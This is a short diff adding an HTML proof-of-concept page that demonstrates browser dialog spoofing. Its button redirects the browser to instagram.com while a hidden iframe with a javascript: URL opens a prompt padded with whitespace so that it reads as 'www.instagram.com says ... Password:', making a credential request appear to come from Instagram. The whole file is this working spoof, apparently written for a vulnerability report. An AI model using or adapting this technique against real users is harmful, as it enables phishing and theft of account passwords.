@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC</title>
+    <script>
+    function triggerIframe() {
+        var iframe = document.createElement('iframe');
+        document.location="http://www.instagram.com";
+        iframe.src = 'javascript:prompt("www.instagram.com says                                                                                                                                     Password:")';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+    }
+    </script>
+</head>
+<body>
+    <button onclick="triggerIframe()">Trigger</button>
+</body>
+</html>
